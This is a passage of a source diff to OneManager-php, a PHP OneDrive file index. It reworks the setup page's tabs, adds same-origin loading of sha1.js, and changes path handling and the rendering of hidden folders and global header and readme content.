-        xhr.send("pass=" + sha1(config_f.pass.value + "" + timestamp) + "&config_b=" + b.value + "&timestamp=" + timestamp);
+        xhr.send("pass=" + sha1(config_f.pass.value + "" + timestamp) + "&config_b=" + b.value + "&timestamp=" + timestamp + "&_admin=" + localStorage.getItem("admin"));
     }
     function importConfig(b) {
         if (config_f.pass.value=="") {
@@ -1662,7 +2086,7 @@ function EnvOpt($needUpdate = 0)
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1681,7 +2105,7 @@ function EnvOpt($needUpdate = 0)
         xhr.onerror = function(e){
             alert("Network Error "+xhr.status);
         }
-        xhr.send("pass=" + sha1(config_f.pass.value + "" + timestamp) + "&config_t=" + encodeURIComponent(config_f.config_t.value) + "&config_b=" + b.value + "&timestamp=" + timestamp);
+        xhr.send("pass=" + sha1(config_f.pass.value + "" + timestamp) + "&config_t=" + encodeURIComponent(config_f.config_t.value) + "&config_b=" + b.value + "&timestamp=" + timestamp + "&_admin=" + localStorage.getItem("admin"));
     }
     function changePassword(f) {
         if (f.oldPass.value==""||f.newPass1.value==""||f.newPass2.value=="") {
@@ -1699,7 +2123,7 @@ function EnvOpt($needUpdate = 0)
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1707,36 +2131,56 @@ function EnvOpt($needUpdate = 0)
         f.oldPass.value = sha1(f.oldPass.value + "" + timestamp);
         return true;
     }
+    function loadjs(url) {
+        var xhr = new XMLHttpRequest;
+        xhr.open("GET", url);
+        xhr.onload = function(e) {
+            if (xhr.status==200) {
+                var script = document.createElement("script");
+                script.type = "text/javascript";
+                script.text = xhr.responseText;
+                document.body.appendChild(script);
+            } else {
+                console.log(xhr.response);
+            }
+        }
+        xhr.send(null);
+    }
 </script>';
     }
     $html .= '
 <style type="text/css">
-    .tabs td { padding: 5px; }
+    .tabs { padding: 10px; white-space: nowrap; overflow-x: auto;}
+    .tabs a { margin:0 10px; }
 </style>
-<table border=0>
-    <tr class="tabs">';
-    if ($_GET['disktag']=='') {
+<div class="tabs">';
+    if ($_GET['disktag']==''||$_GET['disktag']===true||!in_array($_GET['disktag'], $disktags)) {
         if ($_GET['setup']==='platform') $html .= '
-        <td><a href="?setup">' . getconstStr('Home') . '</a></td>
-        <td>' . getconstStr('PlatformConfig') . '</td>';
+    <a href="?setup">' . getconstStr('Home') . '</a>
+    ' . getconstStr('PlatformConfig') . '';
         else $html .= '
-        <td>' . getconstStr('Home') . '</td>
-        <td><a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a></td>';
+    ' . getconstStr('Home') . '
+    <a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a>';
     } else $html .= '
-        <td><a href="?setup">' . getconstStr('Home') . '</a></td>
-        <td><a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a></td>';
+    <a href="?setup">' . getconstStr('Home') . '</a>
+    <a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a>';
     foreach ($disktags as $disktag) {
         if ($disktag!='') {
-            if ($_GET['disktag']==$disktag) $html .= '
-        <td>' . $disktag . '</td>';
+            if ($_GET['disktag']===$disktag) $html .= '
+    ' . $disktag . '';
             else $html .= '
-        <td><a href="?setup&disktag=' . $disktag . '">' . $disktag . '</a></td>';
+    <a href="?setup&disktag=' . $disktag . '">' . $disktag . '</a>';
         }
     }
     $html .= '
-    </tr>
-</table><br>';
+</div><br>';
     $html .= $frame;
+    $html .= '<script>
+    var inputAdminStorage = document.getElementsByName("_admin");
+    for (i=0;i<inputAdminStorage.length;i++) {
+        inputAdminStorage[i].value = localStorage.getItem("admin");
+    }
+</script>';
     return message($html, getconstStr('Setup'));
 }
 
@@ -1747,30 +2191,37 @@ function render_list($path = '', $files = [])
     global $slash;
 
     if (isset($files['list']['index.html']) && !$_SERVER['admin']) {
-        //$htmlcontent = fetch_files(spurlencode(path_format(urldecode($path) . '/index.html'), '/'))['content'];
-        $htmlcontent = get_content(spurlencode(path_format(urldecode($path) . '/index.html'), '/'))['content'];
+        $htmlcontent = get_content(path_format($path . '/index.html'))['content'];
         return output($htmlcontent['body'], $htmlcontent['stat']);
     }
-    $path = str_replace('%20','%2520',$path);
-    $path = str_replace('+','%2B',$path);
-    $path = str_replace('&','&amp;',path_format(urldecode($path))) ;
-    $path = str_replace('%20',' ',$path);
-    $path = str_replace('#','%23',$path);
+    //$path = str_replace('%20','%2520',$path);
+    //$path = str_replace('+','%2B',$path);
+    $path1 = path_format(urldecode($path));
+    //$path = str_replace('&','&amp;', $path) ;
+    //$path = str_replace('%20',' ',$path);
+    //$path = str_replace('#','%23',$path);
     $p_path='';
-    if ($path !== '/') {
+    if ($path1 !== '/') {
         if ($files['type']=='file') {
-            $pretitle = str_replace('&','&amp;', $files['name']);
+            if (isset($files['name'])) {
+                $pretitle = str_replace('&','&amp;', $files['name']);
+            } else {
+                if (substr($path1, 0, 1)=='/') $pretitle = substr($path1, 1);
+                if (substr($path1, -1)=='/') $pretitle = substr($pretitle, 0, -1);
+                $pretitle = str_replace('&','&amp;', $pretitle);
+            }
             $n_path = $pretitle;
-            $tmp = splitlast(splitlast($path,'/')[0],'/');
+            $tmp = splitlast(splitlast($path1,'/')[0],'/');
             if ($tmp[1]=='') {
                 $p_path = $tmp[0];
             } else {
                 $p_path = $tmp[1];
             }
         } else {
-            if (substr($path, 0, 1)=='/') $pretitle = substr($path, 1);
-            if (substr($path, -1)=='/') $pretitle = substr($pretitle, 0, -1);
-            $tmp=splitlast($pretitle,'/');
+            if (substr($path1, 0, 1)=='/') $pretitle = substr($path1, 1);
+            if (substr($path1, -1)=='/') $pretitle = substr($pretitle, 0, -1);
+            $pretitle = str_replace('&','&amp;', $pretitle);
+            $tmp = splitlast($pretitle, '/');
             if ($tmp[1]=='') {
                 $n_path = $tmp[0];
             } else {
@@ -1789,12 +2240,13 @@ function render_list($path = '', $files = [])
     }
     $n_path = str_replace('&amp;','&',$n_path);
     $p_path = str_replace('&amp;','&',$p_path);
-    $pretitle = str_replace('%23','#',$pretitle);
+    //$pretitle = str_replace('%23','#',$pretitle);
     $statusCode = 200;
     date_default_timezone_set(get_timezone($_SERVER['timezone']));
     $authinfo = '
 <!--
     OneManager: An index & manager of Onedrive auth by ysun.
+    HIT Gitlab: https://git.hit.edu.cn/ysun/OneManager-php
     Github: https://github.com/qkqpttgf/OneManager-php
 -->';
     //$authinfo = $path . '<br><pre>' . json_encode($files, JSON_PRETTY_PRINT) . '</pre>';
@@ -1933,9 +2385,20 @@ function render_list($path = '', $files = [])
             while (strpos($html, '<!--GuestEnd-->')) $html = str_replace('<!--GuestEnd-->', '', $html);
         }
 
-        if ($_SERVER['ishidden']==4) {
+        if ($_SERVER['ishidden']<4 || ($files['type']=='file'&&getConfig('downloadencrypt', $_SERVER['disktag']))) {
+            while (strpos($html, '<!--EncryptedStart-->')) {
+                $tmp = splitfirst($html, '<!--EncryptedStart-->');
+                $html = $tmp[0];
+                $tmp = splitfirst($tmp[1], '<!--EncryptedEnd-->');
+                $html .= $tmp[1];
+            }
+            while (strpos($html, '<!--IsNotHiddenStart-->')) {
+                $html = str_replace('<!--IsNotHiddenStart-->', '', $html);
+                $html = str_replace('<!--IsNotHiddenEnd-->', '', $html);
+            }
+        } else {
             // 加密状态
-            if (!getConfig('dontBasicAuth')) {
+            if (getConfig('useBasicAuth')) {
                 // use Basic Auth
                 return output('Need password.', 401, ['WWW-Authenticate'=>'Basic realm="Secure Area"']);
             }
@@ -2008,17 +2471,6 @@ function render_list($path = '', $files = [])
                 $tmp = splitfirst($tmp[1], '<!--FootomfEnd-->');
                 $html .= $tmp[1];
             }
-        } else {
-            while (strpos($html, '<!--EncryptedStart-->')) {
-                $tmp = splitfirst($html, '<!--EncryptedStart-->');
-                $html = $tmp[0];
-                $tmp = splitfirst($tmp[1], '<!--EncryptedEnd-->');
-                $html .= $tmp[1];
-            }
-            while (strpos($html, '<!--IsNotHiddenStart-->')) {
-                $html = str_replace('<!--IsNotHiddenStart-->', '', $html);
-                $html = str_replace('<!--IsNotHiddenEnd-->', '', $html);
-            }
         }
         while (strpos($html, '<!--constStr@Download-->')) $html = str_replace('<!--constStr@Download-->', getconstStr('Download'), $html);
 
@@ -2068,12 +2520,21 @@ function render_list($path = '', $files = [])
             }
         }
         if ($_SERVER['is_guestup_path']||( $_SERVER['admin']&&$files['type']=='folder'&&$_SERVER['ishidden']<4 )) {
-            while (strpos($html, '<!--UploadJsStart-->')) $html = str_replace('<!--UploadJsStart-->', '', $html);
-            while (strpos($html, '<!--UploadJsEnd-->')) $html = str_replace('<!--UploadJsEnd-->', '', $html);
             $now_driver = baseclassofdrive();
-            unset($Driver_arr[$now_driver]);
-            while (strpos($html, '<!--' . $now_driver . 'UploadJsStart-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsStart-->', '', $html);
-            while (strpos($html, '<!--' . $now_driver . 'UploadJsEnd-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsEnd-->', '', $html);
+            if ($now_driver) {
+                while (strpos($html, '<!--UploadJsStart-->')) $html = str_replace('<!--UploadJsStart-->', '', $html);
+                while (strpos($html, '<!--UploadJsEnd-->')) $html = str_replace('<!--UploadJsEnd-->', '', $html);
+                unset($Driver_arr[$now_driver]);
+                while (strpos($html, '<!--' . $now_driver . 'UploadJsStart-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsStart-->', '', $html);
+                while (strpos($html, '<!--' . $now_driver . 'UploadJsEnd-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsEnd-->', '', $html);
+            } else {
+                while (strpos($html, '<!--UploadJsStart-->')) {
+                    $tmp = splitfirst($html, '<!--UploadJsStart-->');
+                    $html = $tmp[0];
+                    $tmp = splitfirst($tmp[1], '<!--UploadJsEnd-->');
+                    $html .= $tmp[1];
+                }
+            }
             foreach ($Driver_arr as $driver) {
                 while (strpos($html, '<!--' . $driver . 'UploadJsStart-->')) {
                     $tmp = splitfirst($html, '<!--' . $driver . 'UploadJsStart-->');
@@ -2124,8 +2585,9 @@ function render_list($path = '', $files = [])
                 $html = str_replace('<!--IsFileStart-->', '', $html);
                 $html = str_replace('<!--IsFileEnd-->', '', $html);
             }
-            $html = str_replace('<!--FileEncodeUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path))), $html);
-            $html = str_replace('<!--FileUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path))), $html);
+            //$html = str_replace('<!--FileEncodeUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
+            $html = str_replace('<!--FileEncodeUrl-->', encode_str_replace(splitlast($path1, '/')[1]), $html);
+            $html = str_replace('<!--FileUrl-->', (path_format($_SERVER['base_disk_path'] . '/' . $path1)), $html);
 
             $ext = strtolower(substr($path, strrpos($path, '.') + 1));
             if (in_array($ext, $exts['img'])) $ext = 'img';
@@ -2152,16 +2614,24 @@ function render_list($path = '', $files = [])
                 $html = str_replace('<!--Is'.$ext.'FileEnd-->', '', $html);
             }
             //while (strpos($html, '<!--FileDownUrl-->')) $html = str_replace('<!--FileDownUrl-->', $files['url'], $html);
-            while (strpos($html, '<!--FileDownUrl-->')) $html = str_replace('<!--FileDownUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
-            while (strpos($html, '<!--FileEncodeReplaceUrl-->')) $html = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
+            //while (strpos($html, '<!--FileDownUrl-->')) $html = str_replace('<!--FileDownUrl-->', (path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
+            while (strpos($html, '<!--FileDownUrl-->')) $html = str_replace('<!--FileDownUrl-->', encode_str_replace(splitlast($path1, '/')[1]), $html);
+            //echo $path . "<br>\n";
+            //while (strpos($html, '<!--FileEncodeReplaceUrl-->')) $html = str_replace('<!--FileEncodeReplaceUrl-->', (path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path))), $html);
+            while (strpos($html, '<!--FileEncodeReplaceUrl-->')) $html = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(splitlast($path1, '/')[1]), $html);
             while (strpos($html, '<!--FileName-->')) $html = str_replace('<!--FileName-->', $files['name'], $html);
             while (strpos($html, '<!--FileEncodeDownUrl-->')) $html = str_replace('<!--FileEncodeDownUrl-->', urlencode($files['url']), $html);
-            //while (strpos($html, '<!--FileEncodeDownUrl-->')) $html = str_replace('<!--FileEncodeDownUrl-->', urlencode(path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
+            //while (strpos($html, '<!--FileEncodeDownUrl-->')) $html = str_replace('<!--FileEncodeDownUrl-->', urlencode($_SERVER['host'] . path_format($_SERVER['base_disk_path'] . '/' . $path)), $html);
             $html = str_replace('<!--constStr@ClicktoEdit-->', getconstStr('ClicktoEdit'), $html);
             $html = str_replace('<!--constStr@CancelEdit-->', getconstStr('CancelEdit'), $html);
             $html = str_replace('<!--constStr@Save-->', getconstStr('Save'), $html);
-            //while (strpos($html, '<!--TxtContent-->')) $html = str_replace('<!--TxtContent-->', htmlspecialchars(curl('GET', $files['url'], '', [], 0, 1)['body']), $html);
-            while (strpos($html, '<!--TxtContent-->')) $html = str_replace('<!--TxtContent-->', htmlspecialchars(get_content(spurlencode(path_format(urldecode($path)), '/'))['content']['body']), $html);
+            if (strpos($html, '<!--TxtContent-->')) {
+                //$tmp_content = get_content(spurlencode(path_format(urldecode($path)), '/'))['content']['body'];
+                $tmp_content = $files['content']['body'];
+                //if (strlen($tmp_content)==$files['size'])
+                $html = str_replace('<!--TxtContent-->', htmlspecialchars($tmp_content), $html);
+                //else $html = str_replace('<!--TxtContent-->', $files['size']<1024*1024?htmlspecialchars(curl('GET', $files['url'], '', [], 0, 1)['body']):"File too large: " . $files['size'] . " B.", $html);
+            }
             $html = str_replace('<!--constStr@FileNotSupport-->', getconstStr('FileNotSupport'), $html);
 
             //$html = str_replace('<!--constStr@File-->', getconstStr('File'), $html);
@@ -2188,6 +2658,7 @@ function render_list($path = '', $files = [])
                 $html = str_replace('<!--IsFolderEnd-->', '', $html);
             }
             $html = str_replace('<!--constStr@File-->', getconstStr('File'), $html);
+            while (strpos($html, '<!--FolderId-->')) $html = str_replace('<!--FolderId-->', $files['id'], $html);
             $html = str_replace('<!--constStr@ShowThumbnails-->', getconstStr('ShowThumbnails'), $html);
             $html = str_replace('<!--constStr@CopyAllDownloadUrl-->', getconstStr('CopyAllDownloadUrl'), $html);
             $html = str_replace('<!--constStr@EditTime-->', getconstStr('EditTime'), $html);
@@ -2203,7 +2674,8 @@ function render_list($path = '', $files = [])
                 if ($file['type']=='folder') {
                     if ($_SERVER['admin'] or !isHideFile($file['name'])) {
                         $filenum++;
-                        $FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path) . '/' . $file['name'])), $FolderList);
+                        //$FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path) . '/' . $file['name'])), $FolderList);
+                        $FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace($file['name']), $FolderList);
                         $FolderListStr = str_replace('<!--FileId-->', $file['id'], $FolderListStr);
                         $FolderListStr = str_replace('<!--FileEncodeReplaceName-->', str_replace('&','&amp;', $file['showname']?$file['showname']:$file['name']), $FolderListStr);
                         $FolderListStr = str_replace('<!--lastModifiedDateTime-->', time_format($file['time']), $FolderListStr);
@@ -2225,7 +2697,8 @@ function render_list($path = '', $files = [])
                         $filenum++;
                         $ext = strtolower(substr($file['name'], strrpos($file['name'], '.') + 1));
                         $FolderListStr = $FolderList;
-                        while (strpos($FolderListStr, '<!--FileEncodeReplaceUrl-->')) $FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path) . '/' . $file['name'])), $FolderListStr);
+                        //while (strpos($FolderListStr, '<!--FileEncodeReplaceUrl-->')) $FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace(path_format($_SERVER['base_disk_path'] . '/' . str_replace('&amp;', '&', $path) . '/' . $file['name'])), $FolderListStr);
+                        while (strpos($FolderListStr, '<!--FileEncodeReplaceUrl-->')) $FolderListStr = str_replace('<!--FileEncodeReplaceUrl-->', encode_str_replace($file['name']), $FolderListStr);
                         $FolderListStr = str_replace('<!--FileExt-->', $ext, $FolderListStr);
                         if (in_array($ext, $exts['music'])) $FolderListStr = str_replace('<!--FileExtType-->', 'audio', $FolderListStr);
                         elseif (in_array($ext, $exts['video'])) $FolderListStr = str_replace('<!--FileExtType-->', 'iframe', $FolderListStr);
@@ -2348,7 +2821,7 @@ function render_list($path = '', $files = [])
 
         while (strpos($html, '<!--base_disk_path-->')) $html = str_replace('<!--base_disk_path-->', (substr($_SERVER['base_disk_path'],-1)=='/'?substr($_SERVER['base_disk_path'],0,-1):$_SERVER['base_disk_path']), $html);
         while (strpos($html, '<!--base_path-->')) $html = str_replace('<!--base_path-->', $_SERVER['base_path'], $html);
-        while (strpos($html, '<!--Path-->')) $html = str_replace('<!--Path-->', str_replace('%23', '#', str_replace('&','&amp;', path_format($path.'/'))), $html);
+        $html = str_replace('<!--Path-->', str_replace('\'', '\\\'', str_replace('%23', '#', str_replace('&','&amp;', path_format($path1.'/')))), $html);
         while (strpos($html, '<!--constStr@Home-->')) $html = str_replace('<!--constStr@Home-->', getconstStr('Home'), $html);
 
         $html = str_replace('<!--customCss-->', getConfig('customCss'), $html);
@@ -2408,11 +2881,11 @@ function render_list($path = '', $files = [])
             $tmp_path = str_replace('&','&amp;', substr(urldecode($_SERVER['PHP_SELF']), strlen($tmp_url)));
             while ($tmp_path!='') {
                 $tmp1 = splitfirst($tmp_path, '/');
-                $folder1 = $tmp1[0];
+                $folder1 = str_replace('&amp;', '&', $tmp1[0]);
                 if ($folder1!='') {
-                    $tmp_url .= str_replace('&amp;', '&', $folder1) . '/';
+                    $tmp_url .= $folder1 . '/';
                     $PathArrayStr1 = str_replace('<!--PathArrayLink-->', encode_str_replace($folder1==$files['name']?'':$tmp_url), $PathArrayStr);
-                    $PathArrayStr1 = str_replace('<!--PathArrayName-->', $folder1, $PathArrayStr1);
+                    $PathArrayStr1 = str_replace('<!--PathArrayName-->', str_replace('&', '&amp;', $folder1), $PathArrayStr1);
                     $html .= $PathArrayStr1;
                 }
                 $tmp_path = $tmp1[1];
@@ -2429,11 +2902,11 @@ function render_list($path = '', $files = [])
             $tmp_path = str_replace('&','&amp;', substr(urldecode($_SERVER['PHP_SELF']), strlen($tmp_url)));
             while ($tmp_path!='') {
                 $tmp1 = splitfirst($tmp_path, '/');
-                $folder1 = $tmp1[0];
+                $folder1 = str_replace('&amp;', '&', $tmp1[0]);
                 if ($folder1!='') {
-                    $tmp_url .= str_replace('&amp;', '&', $folder1) . '/';
+                    $tmp_url .= $folder1 . '/';
                     $PathArrayStr1 = str_replace('<!--PathArrayLink-->', encode_str_replace($folder1==$files['name']?'':$tmp_url), $PathArrayStr);
-                    $PathArrayStr1 = str_replace('<!--PathArrayName-->', ($folder1==$_SERVER['disktag']?(getConfig('diskname')==''?$_SERVER['disktag']:getConfig('diskname')):$folder1), $PathArrayStr1);
+                    $PathArrayStr1 = str_replace('<!--PathArrayName-->', str_replace('&', '&amp;', $folder1==$_SERVER['disktag']?(getConfig('diskname')==''?$_SERVER['disktag']:getConfig('diskname')):$folder1), $PathArrayStr1);
                     $html .= $PathArrayStr1;
                 }
                 $tmp_path = $tmp1[1];
@@ -2491,7 +2964,7 @@ function render_list($path = '', $files = [])
         $imgextstr = '';
         foreach ($exts['img'] as $imgext) $imgextstr .= '\''.$imgext.'\', '; 
         $html = str_replace('<!--ImgExts-->', $imgextstr, $html);
-        
+
 
         $html = str_replace('<!--Sitename-->', $_SERVER['sitename'], $html);
 
@@ -2505,7 +2978,7 @@ function render_list($path = '', $files = [])
             $MultiDiskArea = $tmp[0];
             $tmp = splitfirst($tmp[1], '<!--MultiDisksEnd-->');
             $MultiDisks = $tmp[0];
-            foreach ($disktags as $disk) {
+            foreach ($disktags as $disk) if ($_SERVER['admin']||getConfig('diskDisplay', $disk)=='') {
                 $diskname = getConfig('diskname', $disk);
                 if ($diskname=='') $diskname = $disk;
                 $MultiDisksStr = str_replace('<!--MultiDisksUrl-->', path_format($_SERVER['base_path'].'/'.$disk.'/'), $MultiDisks);
@@ -2521,20 +2994,43 @@ function render_list($path = '', $files = [])
         if ($diskname=='') $diskname = $_SERVER['disktag'];
         //if (strlen($diskname)>15) $diskname = substr($diskname, 0, 12).'...';
         while (strpos($html, '<!--DiskNameNow-->')) $html = str_replace('<!--DiskNameNow-->', $diskname, $html);
-        
+
         $tmp = splitfirst($html, '<!--HeadomfStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--HeadomfEnd-->');
         if (isset($files['list']['head.omf'])) {
-            $headomf = str_replace('<!--HeadomfContent-->', get_content(spurlencode(path_format($path . '/head.omf'), '/'))['content']['body'], $tmp[0]);
+            $headomf = str_replace('<!--HeadomfContent-->', get_content(path_format($path . '/' . $files['list']['head.omf']['name']))['content']['body'], $tmp[0]);
+        } elseif (getConfig('globalHeadOmfUrl')) {
+            if (!$headomfcontent = getcache('HeadomfContent')) {
+                $headomfres = curl('GET', getConfig('globalHeadOmfUrl'), '', [], 0, 1);
+                if ($headomfres['stat']==200) {
+                    $headomfcontent = $headomfres['body'];
+                    savecache('HeadomfContent', $headomfcontent);
+                } else $headomfcontent = $headomfres['stat'];
+            }
+            $headomf = str_replace('<!--HeadomfContent-->', $headomfcontent, $tmp[0]);
         }
         $html .= $headomf . $tmp[1];
-        
+
         $tmp = splitfirst($html, '<!--HeadmdStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--HeadmdEnd-->');
         if (isset($files['list']['head.md'])) {
-            $headmd = str_replace('<!--HeadmdContent-->', get_content(spurlencode(path_format($path . '/head.md'), '/'))['content']['body'], $tmp[0]);
+            $headmd = str_replace('<!--HeadmdContent-->', get_content(path_format($path . '/' . $files['list']['head.md']['name']))['content']['body'], $tmp[0]);
+            $html .= $headmd . $tmp[1];
+            while (strpos($html, '<!--HeadmdStart-->')) {
+                $html = str_replace('<!--HeadmdStart-->', '', $html);
+                $html = str_replace('<!--HeadmdEnd-->', '', $html);
+            }
+        } elseif (getConfig('globalHeadMdUrl')) {
+            if (!$headmdcontent = getcache('HeadmdContent')) {
+                $headmdres = curl('GET', getConfig('globalHeadMdUrl'), '', [], 0, 1);
+                if ($headmdres['stat']==200) {
+                    $headmdcontent = $headmdres['body'];
+                    savecache('HeadmdContent', $headmdcontent);
+                } else $headmdcontent = $headmdres['stat'];
+            }
+            $headmd = str_replace('<!--HeadmdContent-->', $headmdcontent, $tmp[0]);
             $html .= $headmd . $tmp[1];
             while (strpos($html, '<!--HeadmdStart-->')) {
                 $html = str_replace('<!--HeadmdStart-->', '', $html);
@@ -2567,7 +3063,22 @@ function render_list($path = '', $files = [])
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--ReadmemdEnd-->');
         if (isset($files['list']['readme.md'])) {
-            $Readmemd = str_replace('<!--ReadmemdContent-->', get_content(spurlencode(path_format($path . '/readme.md'),'/'))['content']['body'], $tmp[0]);
+            //$Readmemd = str_replace('<!--ReadmemdContent-->', get_content(spurlencode(path_format($path1 . '/' . $files['list']['readme.md']['name']),'/'))['content']['body'], $tmp[0]);
+            $Readmemd = str_replace('<!--ReadmemdContent-->', get_content(path_format($path . '/' . $files['list']['readme.md']['name']))['content']['body'], $tmp[0]);
+            $html .= $Readmemd . $tmp[1];
+            while (strpos($html, '<!--ReadmemdStart-->')) {
+                $html = str_replace('<!--ReadmemdStart-->', '', $html);
+                $html = str_replace('<!--ReadmemdEnd-->', '', $html);
+            }
+        } elseif (getConfig('globalReadmeMdUrl')) {
+            if (!$readmemdcontent = getcache('ReadmemdContent')) {
+                $readmemdres = curl('GET', getConfig('globalReadmeMdUrl'), '', [], 0, 1);
+                if ($readmemdres['stat']==200) {
+                    $readmemdcontent = $readmemdres['body'];
+                    savecache('ReadmemdContent', $readmemdcontent);
+                } else $readmemdcontent = $readmemdres['stat'];
+            }
+            $Readmemd = str_replace('<!--ReadmemdContent-->', $readmemdcontent, $tmp[0]);
             $html .= $Readmemd . $tmp[1];
             while (strpos($html, '<!--ReadmemdStart-->')) {
                 $html = str_replace('<!--ReadmemdStart-->', '', $html);
@@ -2584,20 +3095,28 @@ function render_list($path = '', $files = [])
             }
         }
 
-        
+
         $tmp = splitfirst($html, '<!--FootomfStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--FootomfEnd-->');
         if (isset($files['list']['foot.omf'])) {
-            $Footomf = str_replace('<!--FootomfContent-->', get_content(spurlencode(path_format($path . '/foot.omf'),'/'))['content']['body'], $tmp[0]);
+            $Footomf = str_replace('<!--FootomfContent-->', get_content(path_format($path . '/' . $files['list']['foot.omf']['name']))['content']['body'], $tmp[0]);
+        } elseif (getConfig('globalFootOmfUrl')) {
+            if (!$footomfcontent = getcache('FootomfContent')) {
+                $footres = curl('GET', getConfig('globalFootOmfUrl'), '', [], 0, 1);
+                if ($footres['stat']==200) {
+                    $footomfcontent = $footres['body'];
+                    savecache('FootomfContent', $footomfcontent);
+                } else $footomfcontent = $footres['stat'];
+            }
+            $Footomf = str_replace('<!--FootomfContent-->', $footomfcontent, $tmp[0]);
         }
         $html .= $Footomf . $tmp[1];
 
-        
         $tmp = splitfirst($html, '<!--MdRequireStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--MdRequireEnd-->');
-        if (isset($files['list']['head.md'])||isset($files['list']['readme.md'])) {
+        if (isset($files['list']['head.md'])||isset($files['list']['readme.md'])||getConfig('globalHeadMdUrl')||getConfig('globalReadmeMdUrl')) {
             $html .= $tmp[0] . $tmp[1];
         } else $html .= $tmp[1];
 
@@ -2669,9 +3188,9 @@ function render_list($path = '', $files = [])
         }
 
         // 最后清除换行
-        while (strpos($html, "\r\n\r\n")) $html = str_replace("\r\n\r\n", "\r\n", $html);
+        //while (strpos($html, "\r\n\r\n")) $html = str_replace("\r\n\r\n", "\r\n", $html);
         //while (strpos($html, "\r\r")) $html = str_replace("\r\r", "\r", $html);
-        while (strpos($html, "\n\n")) $html = str_replace("\n\n", "\n", $html);
+        //while (strpos($html, "\n\n")) $html = str_replace("\n\n", "\n", $html);
         //while (strpos($html, PHP_EOL.PHP_EOL)) $html = str_replace(PHP_EOL.PHP_EOL, PHP_EOL, $html);
 
         $exetime = round(microtime(true)-$_SERVER['php_starttime'],3);
